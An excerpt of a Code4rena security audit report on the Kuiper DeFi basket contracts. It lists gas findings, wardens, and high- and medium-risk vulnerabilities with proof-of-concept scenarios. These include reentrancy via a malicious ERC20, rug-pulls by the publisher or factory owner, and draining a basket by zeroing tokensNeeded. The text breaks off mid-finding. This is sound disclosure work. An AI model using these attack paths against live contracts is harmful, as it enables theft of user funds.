href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/45\">[G-13] Factory:constructor don’t need to zero initialize storage variable</a> <em>Submitted by GiveMeTestEther, also found by gzeon, Jujic, kenzo, sirhashalot, TomFrenchBlockchain, WatchPug, and ye0lde</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/46\">[G-14] Basket:initialize() reuse function argument instead of storage variable</a> <em>Submitted by GiveMeTestEther</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/47\">[G-15] Basket:handleFees() use unchecked to save gas</a> <em>Submitted by GiveMeTestEther</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/161\">[G-16] Function handleFees #L148-L151 and updateIBRatio (Basket.sol) can be refactored for efficiency and clarity</a> <em>Submitted by ye0lde, also found by GiveMeTestEther, kenzo, and WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/49\">[G-17] Basket:pushUnderlying()/pullUnderlying() cache ibRatio to save gas</a> <em>Submitted by GiveMeTestEther, also found by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/118\">[G-18] <code>validateWeights()</code> Limit loop to a meaningful bound can save gas</a> <em>Submitted by WatchPug, also found by danb, GiveMeTestEther, kenzo, and TomFrenchBlockchain</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/113\">[G-19] Useless imports</a> <em>Submitted by Jujic</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/84\">[G-20] Avoid Initialization of Loop Index If It Is 0 to Save Gas</a> <em>Submitted by Meta0xNull</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/2\">[G-21] Extra ERC20 approvals/transfers on Basket deployment</a> <em>Submitted by TomFrenchBlockchain</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/36\">[G-22] Auction.auctionOngoing variable is unnecessary</a> <em>Submitted by TomFrenchBlockchain</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/37\">[G-23] Auction.hasBonded variable is unnecessary</a> <em>Submitted by TomFrenchBlockchain</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/38\">[G-24] Excessive checking of basket totalsupply</a> <em>Submitted by TomFrenchBlockchain, also found by kenzo</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/4\">[G-25] Minted and Burned events are unnecessary</a> <em>Submitted by TomFrenchBlockchain</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/41\">[G-26] Publisher switch logic can be simplified</a> <em>Submitted by TomFrenchBlockchain, also found by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/129\">[G-27] Gas Optimization: Reorder storage layout</a> <em>Submitted by gzeon, also found by saian</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/57\">[G-28] <code>auctionImpl</code> and <code>basketImpl</code> in factory can be made immutable for gas savings</a> <em>Submitted by TomFrenchBlockchain, also found by bw, gzeon, and robee</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/100\">[G-29] <code>Basket.sol#approveUnderlying()</code> Cache and read storage variables from the stack can save gas</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/107\">[G-30] <code>Auction.sol#auctionOngoing</code> Switching between 1, 2 instead of true, false is more gas efficient</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/117\">[G-31] Use free functions to replace external calls can save gas</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/121\">[G-32] Unnecessary checked arithmetic in for loops</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/123\">[G-33] Adding unchecked directive can save gas</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/126\">[G-34] <code>Auction.sol#initialize()</code> Use msg.sender rather than factory_ parameter can save gas</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/92\">[G-35] <code>Basket.sol#initialize()</code> Remove redundant assertion can save gas</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/7\">[G-36] Gas: Redundant check in <code>setNewMaxSupply</code></a> <em>Submitted by cmichel</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/91\">[G-37] Unused imports</a> <em>Submitted by WatchPug, also found by robee</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/130\">[G-38] Gas Optimization: Use calldata instead of memory</a> <em>Submitted by gzeon</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/162\">[G-39] Function changePublisher, changeLicenseFee, and setNewMaxSupply  can be refactored for efficiency and clarity</a> <em>Submitted by ye0lde, also found by neslinesli93</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/18\">[G-40] Storage double reading. Could save SLOAD</a> <em>Submitted by robee</em></li>\n</ul>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-1\">High Risk Findings (1)</a></p>\n<ul>\n<li><a href=\"#h-01-wrong-fee-calculation-after-totalsupply-was-0\">[H-01] Wrong fee calculation after <code>totalSupply</code> was 0</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-11\">Medium Risk Findings (11)</a></p>\n<ul>\n<li><a href=\"#m-01-missing-cap-on-licensefee\">[M-01] Missing cap on <code>LicenseFee</code></a></li>\n<li><a href=\"#m-02-publisher-can-lock-all-user-funds-in-the-basket-in-order-to-force-a-user-to-have-their-bond-burned\">[M-02] Publisher can lock all user funds in the <code>Basket</code> in order to force a user to have their bond burned</a></li>\n<li><a href=\"#m-03-basketsolauctionburn-calculates-ibratio-wrong\">[M-03] <code>Basket.sol#auctionBurn</code> calculates <code>ibRatio</code> wrong</a></li>\n<li><a href=\"#m-04-reentrancy-vulnerability-in-basket-contracts-initialize-method\">[M-04] Reentrancy vulnerability in <code>Basket</code> contract’s <code>initialize()</code> method.</a></li>\n<li><a href=\"#m-05-change-in-auctionmultiplierauctiondecrement-change-profitability-of-auctions-and-factory-can-steal-all-tokens-from-a-basket-abusing-it\">[M-05] Change in <code>auctionMultiplier/auctionDecrement</code> change profitability of auctions and factory can steal all tokens from a basket abusing it</a></li>\n<li><a href=\"#m-06-basket-can-be-fully-drained-if-the-auction-is-settled-within-a-specific-block\">[M-06] Basket can be fully drained if the auction is settled within a specific block</a></li>\n<li><a href=\"#m-07-auctionsolsettleauction-bonder-may-not-be-able-to-settle-a-bonded-auction-leading-to-loss-of-funds\">[M-07] <code>Auction.sol#settleAuction()</code> Bonder may not be able to settle a bonded auction, leading to loss of funds</a></li>\n<li><a href=\"#m-08-lost-fees-due-to-precision-loss-in-fees-calculation\">[M-08] Lost fees due to precision loss in fees calculation</a></li>\n<li><a href=\"#m-09-baskethandlefees-fee-calculation-is-wrong\">[M-09] <code>Basket:handleFees</code> fee calculation is wrong</a></li>\n<li><a href=\"#m-10-fee-calculation-is-slightly-off\">[M-10] Fee calculation is slightly off</a></li>\n<li><a href=\"#m-11-baskethandlefees-fees-are-overcharged\">[M-11] <code>Basket:handleFees():</code> fees are overcharged</a></li>\n</ul>\n</li>\n<li><a href=\"#low-risk-findings-8\">Low Risk Findings (8)</a></li>\n<li><a href=\"#non-critical-findings-29\">Non-Critical Findings (29)</a></li>\n<li><a href=\"#gas-optimizations-40\">Gas Optimizations (40)</a></li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>",
  "md": "\n# Overview\n\n## About C4\n\nCode4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.\n\nA C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\n\nDuring the audit contest outlined in this document, C4 conducted an analysis of the Kuiper smart contract system written in Solidity. The audit contest took place between December 8—December 10 2021.\n\n_Note: this audit contest originally ran under the name `defiProtocol`._\n\n## Wardens\n\n27 Wardens contributed reports to the Kuiper contest:\n\n  1. [kenzo](https://twitter.com/KenzoAgada)\n  1. 0x0x0x\n  1. WatchPug ([jtp](https://github.com/jack-the-pug) and [ming](https://github.com/mingwatch))\n  1. [GiveMeTestEther](https://twitter.com/GiveMeTestEther)\n  1. [gzeon](https://twitter.com/gzeon)\n  1. [TomFrenchBlockchain](https://github.com/TomAFrench)\n  1. [broccolirob](https://twitter.com/0xbroccolirob)\n  1. [Ruhum](https://twitter.com/0xruhum)\n  1. [0v3rf10w](https://twitter.com/_0v3rf10w)\n  1. [gpersoon](https://twitter.com/gpersoon)\n  1. robee\n  1. Jujic\n  1. [ye0lde](https://twitter.com/_ye0lde)\n  1. rishabh\n  1. [Meta0xNull](https://twitter.com/Meta0xNull)\n  1. [cmichel](https://twitter.com/cmichelio)\n  1. saian\n  1. neslinesli93\n  1. [danb](https://twitter.com/danbinnun)\n  1. [pmerkleplant](https://twitter.com/merkleplant_eth)\n  1. pedroais\n  1. [bw](https://github.com/bernard-wagner)\n  1. [sirhashalot](https://twitter.com/SirH4shalot)\n  1. hagrid\n  1. 0x1f8b\n  1. [BouSalman](https://twitter.com/BouSalman)\n\nThis contest was judged by [0xleastwood](https://twitter.com/liam_eastwood13).\n\nFinal report assembled by [liveactionllama](https://twitter.com/liveactionllama).\n\n# Summary\n\nThe C4 analysis yielded an aggregated total of 20 unique vulnerabilities and 89 total findings. All of the issues presented here are linked back to their original finding.\n\nOf these vulnerabilities, 1 received a risk rating in the category of HIGH severity, 11 received a risk rating in the category of MEDIUM severity, and 8 received a risk rating in the category of LOW severity.\n\nC4 analysis also identified 29 non-critical recommendations and 40 gas optimizations.\n\n# Scope\n\nThe code under review can be found within the [C4 Kuiper contest repository](https://github.com/code-423n4/2021-12-defiProtocol), and is composed of 3 smart contracts written in the Solidity programming language and includes 588 lines of Solidity code.\n\n# Severity Criteria\n\nC4 assesses the severity of disclosed vulnerabilities according to a methodology based on [OWASP standards](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology).\n\nVulnerabilities are divided into three primary risk categories: high, medium, and low.\n\nHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\n\n- Malicious Input Handling\n- Escalation of privileges\n- Arithmetic\n- Gas use\n\nFurther information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code423n4.com).\n\n# High Risk Findings (1)\n## [[H-01] Wrong fee calculation after `totalSupply` was 0](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/58)\n_Submitted by kenzo_\n\n`handleFees` does not update `lastFee` if `startSupply == 0`.\nThis means that wrongly, extra fee tokens would be minted once the basket is resupplied and `handleFees` is called again.\n\n### Impact\n\nLoss of user funds.\nThe extra minting of fee tokens comes on the expense of the regular basket token owners, which upon withdrawal would get less underlying than their true share, due to the dilution of their tokens' value.\n\n### Proof of Concept\n\nScenario:\n\n*   All basket token holders are burning their tokens. The last burn would set totalSupply to 0.\n*   After 1 day, somebody mints basket tokens.\n\n`handleFees` would be called upon mint, and would just return since totalSupply == 0. Note: It does not update `lastFee`.\n\n    } else if (startSupply == 0) {\n                return;\n\n[Basket.sol#L136:#L137](https://github.com/code-423n4/2021-12-defiprotocol/blob/main/contracts/contracts/Basket.sol#L136:#L137)\n\n*   The next block, somebody else mints a token. Now `handleFees` will be called and will calculate the fees according to the current supply and the time diff between now and `lastFee`:\n\n<!---->\n\n    uint256 timeDiff = (block.timestamp - lastFee);\n\n[Basket.sol#L139](https://github.com/code-423n4/2021-12-defiprotocol/blob/main/contracts/contracts/Basket.sol#L139)<br>\nBut as we saw, `lastFee` wasn't updated in the previous step. `lastFee` is still the time of 1 day before - when the last person burned his tokens and the basket supply was 0.\nSo now the basket will mint fees as if a whole day has passed since the last calculation, but actually it only needs to calculate the fees for the last block, since only then we had tokens in the basket.\n\n### Recommended Mitigation Steps\n\nSet `lastFee = block.timestamp` if `startSupply == 0`.\n\n**[frank-beard (Kuiper) confirmed](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/58)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/58#issuecomment-1079627201):**\n> The issue can be outlined as follows:\n>  - A user interacts with the basket and mints some amount of tokens, which sets `lastFee = block.timestamp`.\n>  - The same user decides to exit the basket and burn their tokens.\n>  - Some amount of time passes and another user enters the basket, but `handleFees()` did not set `lastFee = block.timestamp`. As a result, fees are charged on the user's deposit for the entire time that the basket was inactive for.\n> \n> It seems that the basket is severely flawed in calculating fees on partially inactive baskets. This puts users' funds at direct risk of being lost. Malicious publishers can setup baskets as a sort of honeypot to abuse this behaviour.\n>\n> This was an interesting find! Kudos to the warden.\n\n\n\n***\n\n \n# Medium Risk Findings (11)\n## [[M-01] Missing cap on `LicenseFee`](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/154)\n_Submitted by gzeon, also found by 0x0x0x and TomFrenchBlockchain_\n\nThere is no cap on `LicenseFee`. While change of `LicenseFee` is under 1 day timelock, introducing a\\\n`maxLicenseFee` can improve credibility by removing the \"rug\" vector. There is a `minLicenseFee` in the contracts, while imo make little sense to have `minLicenseFee` but not `maxLicenseFee`.\n\nAn incorrectly set `LicenseFee` can potentially lead to over/underflow in [Basket.sol#L140-141](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L140-141) which is used in most of the function.\n\n### Proof of Concept\n\n[Basket.sol#L177](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L177)<br>\n[Factory.sol#L77](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Factory.sol#L77)<br>\n[Basket.sol#L49](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L49)\n\n### Recommended Mitigation Steps\n\nDefine a `maxLicenseFee`\n\n**[frank-beard (Kuiper) acknowledged, but disagreed with High severity and commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/154#issuecomment-1048121652):**\n > Generally it is intended for the publishers to act correctly and the timelock is intended to prevent incorrect values from making it all the way through, however there is validity in reducing how the fee can be modified, such as reducing how much any one fee change can change the fee. I would consider this a low risk issue.\n\n**[0xleastwood (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/154#issuecomment-1079621078):**\n > It seems like changes to `licenseFee` could potentially brick the contract as `handleFees()` underflows, preventing users from minting/burning tokens. I'd deem this as `medium` severity due to compromised protocol availability.\n\n\n\n***\n\n## [[M-02] Publisher can lock all user funds in the `Basket` in order to force a user to have their bond burned](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/53)\n_Submitted by TomFrenchBlockchain, also found by WatchPug_\n\nAll user funds in a basket being held hostage by the publisher\n\n### Proof of Concept\n\nThe `Basket` publisher can propose an auction in order to set new tokens and weights with a 1 day timelock.\n\n[Basket.sol#L216-L244](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L216-L244)<br>\n\nAs part of this call they can set the `minIbRatio` variable which determines what the maximum slippage on the auction is allowed to be. If it's set to the current `IbRatio` then the Basket accepts no slippage.\n\nThe publisher can choose to set `minIbRatio = type(uint256).max` which will prevent any auction bids from being successful, locking the basket in the auction state.\n\nIt's not possible to enter or exit the basket while an auction is going on, so any users who hold any funds in the basket are forced to take the only option to kill the auction available to them.\n\n[Basket.sol#L91-L119](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L91-L119)<br>\n\nIf a user makes a bond and then waits a day to then call `Auction.bondBurn`, it will reset the auction and allow users to withdraw but it requires 0.25% of the supply of the basket token to be burned.\n\n[Auction.sol#L121-L134](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Auction.sol#L121-L134)<br>\n\nOne of the basket's users is then forced to give up some of their assets to secure the release of the remaining assets in the basket (for a 24hr period until the publisher starts a new auction).\n\nThis attack can be launched at any time with only 24 hours warning. This is a very short amount of time which near guarantees that if other users hold funds in the basket that not all of them will successfully withdraw in that time and so will have funds locked.\n\n### Recommended Mitigation Steps\n\nAgain this is tricky to mitigate as there are legitimate scenarios where we would expect the `ibRatio` to increase. e.g. a basket containing WBTC being changed to contain USDC as each basket token should be worth much more USDC than it was in terms of WBTC.\n\nTo be frank the entire auction mechanism is a bit shaky as it doesn't account for changes in the values of the tokens over time.\n\n**[frank-beard (Kuiper) acknowledged, but disagreed with High severity and commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/53#issuecomment-1048140154):**\n > This is where community action and the timelock should mitigate attacks of these types. Users should be able to hold publishers accountable for their rebalances, whether that is through a dao or other means. We acknowledge there is some level of trust required between the user and the publisher however this is also intentional, for the types of products this protocol is for.\n\n**[0xleastwood (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/53#issuecomment-1079625679):**\n > Because a timelock is used in this instance, exploiting this issue proves more difficult and requires that the `publisher` is malicious. As we are dealing with an abuse of privileges, I think this fits the criteria of a `medium` severity issue as the issue can only be exploited by a trusted account.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/53#issuecomment-1079816317):**\n > Actually I'm not sure if I understand the exploit:\n>  - The publisher must wait a day to call `Basket.publishNewIndex()`, setting new values and starting an auction. In that time, users are free to exit the protocol as they wish.\n>  - However, users who were not able to exit in time are obligated to call `Auction.bondForRebalance()` in order to unlock the basket's underlying assets. But because `Auction.settleAuction()` will always revert, this user forfeits their bond to unlock the rest of their tokens.\n> \n> In this case, I see this as an abuse of the publisher's privileges and lack of oversight by the users. `medium` severity seems correct in this situation.\n\n\n\n***\n\n## [[M-03] `Basket.sol#auctionBurn` calculates `ibRatio` wrong](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/144)\n_Submitted by 0x0x0x_\n\nThe function is implemented as follows:\n\n    function auctionBurn(uint256 amount) onlyAuction nonReentrant external override {\n            uint256 startSupply = totalSupply();\n            handleFees(startSupply);\n            _burn(msg.sender, amount);\n\n            uint256 newIbRatio = ibRatio * startSupply / (startSupply - amount);\n            ibRatio = newIbRatio;\n\n            emit NewIBRatio(newIbRatio);\n            emit Burned(msg.sender, amount);\n        }\n\nWhen `handleFees` is called, `totalSupply` and `ibRatio` changes accordingly, but for `newIbRatio` calculation tokens minted in `handleFees` is not included. Therefore, `ibRatio` is calculated higher than it should be. This is dangerous, since last withdrawing user(s) lose their funds with this operation. In case this miscalculation happens more than once, `newIbRatio` will increase the miscalculation even faster and can result in serious amount of funds missing. At each time `auctionBurn` is called, at least 1 day (auction duration) of fees result in this miscalculation. Furthermore, all critical logic of this contract is based on `ibRatio`, this behaviour can create serious miscalculations.\n\n### Mitigation step\n\nRather than\n\n`uint256 newIbRatio = ibRatio * startSupply / (startSupply - amount);`\n\nA practical solution to this problem is calculating `newIbRatio` as follows:\n\n    uint256 supply = totalSupply();\n    uint256 newIbRatio = ibRatio * (supply + amount) / supply;\n\n**[frank-beard (Kuiper) confirmed](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/144)**\n\n**[0xleastwood (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/144#issuecomment-1079628195):**\n > The warden has identified an issue whereby `newIbRatio` uses an incorrect `startSupply` variable which is under-represented. As new tokens may be minted in `handleFees()`, this will lead to an incorrect `ibRatio` which is used in all other areas of the protocol. A lower `ibRatio` causes `pushUnderlying()` and `pullUnderlying()` to be improperly accounted for. As a result, burning basket tokens will redeem a smaller amount of underlying tokens and minting basket tokens will require a smaller amount of underlying tokens.\n> \n> This causes the protocol to leak value from all basket token holders but it does not allow assets to be stolen. As such, I think this is better put as a `medium` severity issue.\n\n\n\n***\n\n## [[M-04] Reentrancy vulnerability in `Basket` contract's `initialize()` method.](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/176)\n_Submitted by broccolirob_\n\nA malicious \"publisher\" can create a basket proposal that mixes real ERC20 tokens with a malicious ERC20 token containing a reentrancy callback in it's `approve()` method. When the `initialize()` method is called on the newly cloned `Basket` contract, a method called `approveUnderlying(address(auction))` is called, which would trigger the reentrancy, call `initialize()` again, passing in altered critical values such as `auction` and `factory`, and then removes its self from `proposal.tokens` and `proposal.weights` so it doesn't appear in the token list to basket users.\n\n[Basket.sol#L44-L61](https://github.com/code-423n4/2021-12-defiprotocol/blob/main/contracts/contracts/Basket.sol#L44-L61)\n\n### Impact\n\n`Auction` and `Factory` can be set to custom implementations that do malicious things. Since all baskets and auctions are clones with their own addresses, this fact would be difficult for users to detect. `Auction` controls ibRatio, which a malicious version could send back a manipulated value to `Basket`, allowing the malicious \"publisher\" to burn basket tokens till all users underlying tokens are drained.\n\n### Tools Used\n\nManual review and Hardhat.\n\n### Recommended Mitigation Steps\n\nSince `Basket` inherits from `ERC20Upgradeable` the `initializer` modifier should be available and therefore used here. It has an `inititializing` variable that would prevent this kind of reentrancy attack.\n\n**[frank-beard (Kuiper) confirmed](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/176)**\n\n**[0xleastwood (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/176#issuecomment-1079636401):**\n > While the warden is correct, a malicious publisher could re-enter the `Basket.initialize()` function and overwrite `factory` and `auction` with their own addresses, this does not lead to a direct loss of funds for users. It would require that users interact with their malicious contracts which is entirely possible if baskets created via the factory are deemed as trusted. I think this fits the criteria of a `medium` severity issue.\n\n\n\n***\n\n## [[M-05] Change in `auctionMultiplier/auctionDecrement` change profitability of auctions and factory can steal all tokens from a basket abusing it](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/145)\n_Submitted by 0x0x0x_\n\nWhen factory changes `auctionMultiplier` or `auctionDecrement` profitability of bonded auctions change. There is no protection against this behaviour. Furthermore, factory owners can decide to get all tokens from baskets where they are bonded for the auction.\n\n### Proof of concept\n\n1- Factory owners call `bondForRebalance` for an auction.\n\n2- Factory owners sets `auctionMultiplier` as 0 and `auctionDecrement` as maximum value\n\n3- `settleAuction` is called. `newRatio = 0`, since `a = b = 0`. All tokens can be withdrawn with this call, since `tokensNeeded = 0`.\n\n### Extra notes\n\nFurthermore, even the factory owners does not try to scam users. In case `auctionMultiplier` or `auctionDecrement` is changed, all current `auctionBonder` from `Auctions` can only call `settleAuction` with different constraints. Because of different constraints, users/bonder will lose/gain funds.\n\n### Mitigation step\n\nSave `auctionDecrement` and `auctionMultiplier` to global variables in `Auction.sol`, when `startAuction` is called.\n\n**[frank-beard (Kuiper) confirmed and commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/145#issuecomment-1049059976):**\n > Adding in protection from the global governance is definitely important.\n\n**[0xleastwood (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/145#issuecomment-1079812584):**\n > The warden has identified an issue whereby the factory owner can rug-pull baskets through the re-balancing mechanism. Because `newRatio = 0`, the basket improperly checks the tokens needed in the contract. However, this assumes that the factory owner is malicious which satisfies `medium` severity due to assets not being at direct risk.\n> \n> The sponsor has decided to add additional protections (potentially via timelock) to mitigate this issue.\n>\n > This rug-pull is made even more difficult by the fact that `newRatio` must be `>= minIbRatio`. Because `minIbRatio` is behind timelock, I think this rug vector is unlikely or at least can only be used to steal a fixed amount of funds.\n\n\n\n***\n\n## [[M-06] Basket can be fully drained if the auction is settled within a specific block](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/74)\n_Submitted by Ruhum_\n\nThe `settleAuction()` function allows someone to settle the auction by transferring funds in a way that the new pending index is fulfilled. As a reward, they are able to take out as many tokens as they want as long as the pending index is fulfilled after that. The function verifies that the basket has received everything it wanted using the following logic:\n\n```solidity\n  for (uint256 i = 0; i < pendingWeights.length; i++) {\n      uint256 tokensNeeded = basketAsERC20.totalSupply() * pendingWeights[i] * newRatio / BASE / BASE;\n      require(IERC20(pendingTokens[i]).balanceOf(address(basket)) >= tokensNeeded);\n  }\n```\n\nThe attack vector here is to manipulate `tokensNeeded` to be 0. That way we can drain the basket completely 